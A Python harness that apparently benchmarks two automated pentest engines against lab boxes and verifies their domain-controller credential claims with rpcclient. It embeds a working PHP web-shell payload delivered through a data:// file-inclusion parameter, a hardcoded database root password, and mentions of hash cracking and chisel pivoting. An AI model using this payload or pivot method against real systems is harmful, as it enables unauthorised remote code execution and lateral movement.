#!/usr/bin/env python3
"""
gunbelt autocannon A/B harness.  Runs on your-host.

For each (box, engine): reset the box to pristine, wait for mysql, run the engine to
completion, collect its result.json, then INDEPENDENTLY verify the DC-owned claim with
rpcclient (real auth, guest-proof) — so a guest false-positive can't score as a win.

  engine "mine"   = carousel.py, runs ON your-host (local fire), GPU phpass crack on your-host GPU1,
                    real chisel reverse-SOCKS pivot through the web RCE, rpcclient DC verify.
  engine "theirs" = warroom_headless.py, runs on your-host, ssh-mux fire to your-host, your-host-1.7b
                    amber gate, hardcoded DC creds, direct (no-pivot) DC shots.

Boxes are identical twins on different /24s: lab=172.30/172.31, lab2=172.32/172.33.
Each engine runs on BOTH boxes to cancel any asymmetry.
"""
import subprocess, json, time, sys, os

JAGG="your-host"
HERE=os.path.dirname(os.path.abspath(__file__))
BOXES={"lab":("gunbelt-lab","172.30.0","172.31.0"),
       "lab2":("gunbelt-lab2","172.32.0","172.33.0")}
TRIALS=int(os.environ.get("AB_TRIALS","1"))

def run(cmd,timeout=240,**kw):
    return subprocess.run(cmd,shell=isinstance(cmd,str),capture_output=True,text=True,
                          timeout=timeout,**kw)

def jssh(cmd,timeout=240):
    return subprocess.run(["ssh","-o","ConnectTimeout=8",JAGG,cmd],
                          capture_output=True,text=True,timeout=timeout)

def reset(box):
    d=BOXES[box][0]
    # kill stale pivot infra + prior work, reset compose
    jssh(f"for p in 39901 39902 39903; do fuser -k $p/tcp 2>/dev/null; done; pkill -f gbch 2>/dev/null; "
         f"cd /home/operator/{d} && ./reset.sh >/tmp/reset_{box}.log 2>&1; echo done",timeout=120)

def wait_mysql(edge,tries=40):
    import base64
    web=f"{edge}.20"; b="PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="
    php="<?php $c=@new mysqli('db','root','Sup3RS3cuR3@123');echo $c->connect_errno?'NO':'YES';"
    pb=base64.b64encode(php.encode()).decode()
    c=f"echo {pb}|base64 -d>/tmp/rdy.php&&php /tmp/rdy.php;rm -f /tmp/rdy.php"
    for _ in range(tries):
        r=jssh(f"curl -s --max-time 8 -G http://{web}/index.php "
               f"--data-urlencode 'page=data://text/plain;base64,{b}' --data-urlencode c='{c}'",
               timeout=20)
        if "YES" in r.stdout: return True
        time.sleep(2)
    return False

def verify_dc(intnet,cred):
    """Independent, guest-proof check: does <cred> REALLY authenticate to the DC?"""
    if not cred or "%" not in cred and ":" not in cred:
        # theirs stores "u:pw", mine stores tuple->"('u','pw')"; normalize
        pass
    # normalize cred to u,pw
    u=pw=None
    if cred and ":" in cred and "%" not in cred and "(" not in cred:
        u,pw=cred.split(":",1)
    elif cred and "(" in cred:  # "('tom', 'charlie1')"
        import ast
        try: u,pw=ast.literal_eval(cred)
        except Exception: pass
    if not u: return {"checked":False,"reason":"no cred to check"}
    dc=f"{intnet}.40"
    out=jssh(f"rpcclient -U '{u}%{pw}' {dc} -c 'getusername;enumdomusers' 2>&1",timeout=30).stdout
    real=(f"Account Name: {u}".lower() in out.lower()) and "nobody" not in out.lower()
    return {"checked":True,"cred":f"{u}:{pw}","genuine_auth":real,
            "note":"" if real else "did NOT authenticate (guest/reject) — claim would be false"}

def run_theirs(edge,intnet):
    work=f"/tmp/gb-ab/theirs-{edge}"
    env=dict(os.environ,GB_EDGE=edge,GB_INT=intnet,GB_WORK=work)
    t=time.time()
    p=run(["python3",f"{HERE}/warroom_headless.py"],timeout=300,env=env)
    sys.stdout.write(p.stdout[-1500:] if p.stdout else "");
    try: res=json.load(open(f"{work}/result.json"))
    except Exception as e: res={"engine":"theirs","error":str(e),"stderr":p.stderr[-500:]}
    res["_harness_wall"]=round(time.time()-t,2)
    return res

def run_mine(edge,intnet):
    work=f"/tmp/gb-ab/mine-{edge}"
    jssh(f"rm -rf {work}; mkdir -p {work}",timeout=20)
    t=time.time()
    p=jssh(f"cd /opt/bs2/live && GB_EDGE={edge} GB_INT={intnet} GB_WORK={work} "
           f"timeout 120 python3 carousel.py",timeout=200)
    sys.stdout.write(p.stdout[-1500:] if p.stdout else "")
    r=jssh(f"cat {work}/result.json",timeout=20)
    try: res=json.loads(r.stdout)
    except Exception as e: res={"engine":"mine","error":str(e),"stderr":p.stderr[-500:]}
    res["_harness_wall"]=round(time.time()-t,2)
    return res

def main():
    report=[]
    order=[("mine",run_mine),("theirs",run_theirs)]
    for box,(d,edge,intnet) in BOXES.items():
        for trial in range(TRIALS):
            for name,fn in order:
                print(f"\n########## {name.upper()} @ {box} (trial {trial+1}/{TRIALS}) ##########",flush=True)
                reset(box)
                if not wait_mysql(edge):
                    print("!! mysql never came up; skipping"); continue
                res=fn(edge,intnet)
                cred=res.get("dc_cred")
                ver=verify_dc(intnet,cred) if res.get("dc_owned") else {"checked":False,"reason":"engine did not claim dc_owned"}
                row={"engine":name,"box":box,"trial":trial+1,
                     "wall_s":res.get("wall_s"),"harness_wall":res.get("_harness_wall"),
                     "shots":res.get("shots"),"flags":len(res.get("flags",{})),
                     "flag_vals":sorted(set(res.get("flags",{}).values())),
                     "dc_owned_claimed":res.get("dc_owned"),"dc_cred":cred,
                     "creds_source":res.get("creds_source",res.get("creds","derived (GPU crack)")
                                            if name=="mine" else "?"),
                     "dc_detection":res.get("dc_detection","rpcclient getusername (guest-proof)"),
                     "pivot":res.get("pivot","chisel reverse-SOCKS through web RCE"),
                     "independent_verify":ver}
                report.append(row)
                print(f">>> {name}@{box}: wall={row['wall_s']}s shots={row['shots']} "
                      f"flags={row['flags']} dc_claimed={row['dc_owned_claimed']} "
                      f"verify={ver.get('genuine_auth')}",flush=True)
    os.makedirs("/tmp/gb-ab",exist_ok=True)
    json.dump(report,open("/tmp/gb-ab/report.json","w"),indent=2)
    # summary table
    print("\n"+"="*100)
    print(f"{'engine':7} {'box':5} {'wall_s':>7} {'shots':>6} {'flags':>6} {'dc_claim':>9} "
          f"{'dc_REAL':>8}  {'creds':<28} pivot")
    print("-"*100)
    for r in report:
        gv=r["independent_verify"].get("genuine_auth")
        print(f"{r['engine']:7} {r['box']:5} {str(r['wall_s']):>7} {str(r['shots']):>6} "
              f"{r['flags']:>6} {str(r['dc_owned_claimed']):>9} {str(gv):>8}  "
              f"{str(r['creds_source'])[:28]:<28} {str(r['pivot'])[:30]}")
    print("="*100)
    print("report -> /tmp/gb-ab/report.json")

if __name__=="__main__":
    main()
